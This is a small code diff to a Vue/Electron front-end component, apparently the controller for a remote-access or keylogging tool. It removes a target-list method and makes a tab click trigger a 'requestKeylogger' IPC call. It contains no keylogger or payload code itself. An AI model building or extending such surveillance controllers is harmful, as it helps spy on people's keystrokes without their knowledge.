@@ -21,7 +21,6 @@
 import FileBrowser from './mainComponents/FileBrowser'
 import { ipcRenderer } from 'electron'
 import { startServer } from '../../../main/Connect/server'
-import request from '../../../main/Connect/request'
 
 export default {
   name: 'browser-page',
@@ -46,7 +45,7 @@ export default {
     handleClickTab (route) {
       this.$store.commit('changeTab', route)
       this.$router.push(route)
-      this.updateTargetList()
+      this.requestKeylogger()
       // request.getFilePreview().then((packet) => {
       //   console.log(packet)
       // })
@@ -74,12 +73,6 @@ export default {
         alert('Vue:' + packet)
       })
       ipcRenderer.send('requestKeylogger', 'stop')
-    },
-    updateTargetList() {
-      ipcRenderer.once('updateTargetList', (event, packet) => {
-        alert(JSON.stringify(packet))
-      })
-      ipcRenderer.send('requestTargetList')
     },
     removeTab (targetName) {
       // 首页不允许被关闭（为了防止el-tabs栏中一个tab都没有）
